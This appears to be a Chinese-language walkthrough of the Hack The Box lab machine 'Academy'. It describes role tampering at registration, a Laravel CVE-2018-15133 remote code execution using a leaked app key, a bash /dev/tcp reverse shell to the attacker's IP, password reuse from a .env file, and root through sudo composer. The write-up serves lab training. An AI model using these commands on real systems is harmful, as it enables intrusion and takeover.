## 端口扫描

首先常规nmap扫描

```
nmap -o nmapinitial -sC -sV -sT -Pn 10.10.10.215
```

![image-20210220003213124](https://static.hack1s.fun/images/2021/02/19/image-20210220003213124.png)

发现开了80和22

浏览器访问80发现需要改一下hosts

```bash
vim /etc/hosts
```

在里面最下面加上

```
10.10.10.215 academy.htb
```



## www-data

之后在访问发现就是一个登录窗口

![image-20210220003412088](https://static.hack1s.fun/images/2021/02/19/image-20210220003412088.png)

可以注册登录

注册页面用burp抓包发现全部都是明文

![image-20210220003742397](https://static.hack1s.fun/images/2021/02/19/image-20210220003742397.png)

这个roleid看着比较可疑，注册时改成1之后可以用这个用户去访问`admin.php`

![image-20210220004427846](https://static.hack1s.fun/images/2021/02/19/image-20210220004427846.png)

在这个页面又看到了一个新的二级域名

访问之后像是一个debug界面

![image-20210220005817653](https://static.hack1s.fun/images/2021/02/19/image-20210220005817653.png)

这个页面里面能发现服务用的是monolog、laravel

在searchsploit搜一下

![image-20210220010135794](https://static.hack1s.fun/images/2021/02/19/image-20210220010135794.png)

发现有一个RCE，可以尝试一下

msf里头的这个运行之后一直提示无法创建session

github搜到这个CVE的exp

https://github.com/aljavier/exploit_laravel_cve-2018-15133

在上面那个http://dev-staging-01.academy.htb里面首先可以找到有的报错信息中含有APP Key

拿着这个key和exp的脚本运行命令

```bash
'bash -i > &/dev/tcp/10.10.14.135/1234 0>&1'
```

本地再开一个终端用nc监听

```bash
nc -lvvp 1234
```

但是不知道为啥有连接，但是没有办法交互，只能用exp慢慢执行命令了



## user

发现在`/var/www/html/academy/.env`里面有一些配置的密码

![image-20210220015942316](https://static.hack1s.fun/images/2021/02/19/image-20210220015942316.png)

按照Hack The Box的靶机习惯，感觉这个mySup3rP4s5w0rd!!可能是哪个用户的密码，至少在哪里能用到；

之后查看`/etc/passwd`发现了一些比较像用户级用户的名称

![image-20210220020123831](https://static.hack1s.fun/images/2021/02/19/image-20210220020123831.png)

这里面用这个密码连`cry0l1t3`这个用户发现可以ssh连上

之后就拿到user.txt的flag



## root

想要查看passwd，结果发现这个用户不在wheel组，没有sudo权限

![image-20210220020413701](https://static.hack1s.fun/images/2021/02/19/image-20210220020413701.png)

传了个提权脚本https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git

扫描到一个密码

![image-20210220021551396](https://static.hack1s.fun/images/2021/02/19/image-20210220021551396.png)

用户名`mrb3n`密码`mrb3n_Ac@d3my!`

登录这个用户之后执行

`sudo -l`

![image-20210220021920063](https://static.hack1s.fun/images/2021/02/19/image-20210220021920063.png)

看到composer具有sudo权限

在GTFObins里搜索composer https://gtfobins.github.io/gtfobins/composer/

把GTFObins里面那段代码跑一遍就提权了

![image-20210220022153764](https://static.hack1s.fun/images/2021/02/19/image-20210220022153764.png)

之后拿到root的flag

